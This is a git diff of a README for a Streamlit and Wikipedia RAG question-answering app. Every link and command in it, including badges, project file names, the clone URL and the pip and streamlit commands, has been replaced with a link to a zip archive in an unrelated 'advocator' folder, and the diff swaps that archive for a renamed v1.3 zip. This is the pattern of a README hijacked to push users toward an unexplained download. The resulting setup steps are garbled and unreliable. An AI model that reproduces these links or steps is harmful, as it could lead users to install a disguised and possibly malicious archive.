@@ -1,12 +1,12 @@
 # WIKI-RAG 
 **Retrieval-Augmented Generation (RAG) Q&A App using Streamlit and Wikipedia**
 
-[![Open in Streamlit](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
+[![Open in Streamlit](https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip)](https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip)
 
-![Streamlit](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
-![HuggingFace](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip%20Face-Transformers-yellow?logo=huggingface)
-![Python](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
-![License](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
+![Streamlit](https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip)
+![HuggingFace](https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip%20Face-Transformers-yellow?logo=huggingface)
+![Python](https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip)
+![License](https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip)
 
 ---
 
@@ -31,10 +31,10 @@ It uses:
 ## 📂 Project Structure
 ```cpp
 WIKI-RAG/
-├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Streamlit app
-├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Notebook for testing in Colab
-├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Dependencies
-├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Documentation
+├── https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip # Streamlit app
+├── https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip # Notebook for testing in Colab
+├── https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip # Dependencies
+├── https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip # Documentation
 └── .gitignore
 ```
 
@@ -46,7 +46,7 @@ WIKI-RAG/
 
 1. **Clone the Repository:**
    ```bash
-   git clone https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip
+   git clone https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip
    cd WIKI-RAG
    ```
    
@@ -57,13 +57,13 @@ venv\Scripts\activate   # Windows
 # or
 source venv/bin/activate   # Mac/Linux
 
-pip install -r https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip
+pip install -r https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip
 
 ```
 
 3.**Run the App**
 ```py
-streamlit run https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip
+streamlit run https://github.com/BVNAHUSH/WIKI-RAG/raw/refs/heads/main/advocator/WIK-RAG-v1.3.zip
 ```
 
 4.**Open in Browser:**  
